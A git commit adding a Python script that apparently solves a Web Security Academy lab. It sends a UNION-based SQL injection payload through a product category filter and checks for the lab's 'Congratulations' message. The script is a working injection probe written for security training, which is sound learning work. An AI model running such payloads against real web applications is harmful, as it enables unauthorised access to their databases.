196dc294bf377aa7172798d754453607f208cffa
Alex <36963270+jaquen@users.noreply.github.com>
2021-04-27 18:46:28 +0900

    Create sqli-union-columns.py

---
+++ sqli-union-columns.py
@@ -0,0 +1,34 @@
+import requests
+import argparse
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-t", "--target", help="Specify a target. \nE.g. -t https://abcdefghijk1234567.web-security-academy.net")
+args = parser.parse_args()
+
+if not args.target:
+    print("[!] You need to spcify a target.")
+    print("[*] Example usage: sqli-union-columns.py -t https://abcdefghijk1234567.web-security-academy.net")
+    exit(0)
+
+# test the connection to the target
+r = requests.get(args.target)
+if r.status_code == 200:
+    print('[*] Target is up')
+else:
+    print('[!] Target seems down')
+    exit(0)
+
+# create the payload
+payload = args.target + "/filter?category=Accessories' UNION SELECT null,null,null--"
+print('[*] Payload created: ' + payload)
+
+r = requests.get(payload)
+if r.status_code == 200:
+    print('[*] Payload sent')
+    # check the contents of the file
+    completion_text = b'Congratulations'
+    if completion_text in r.content:
+        print('[*] Success')
+else:
+    print('[!] Exploit failed')
+    exit(0)
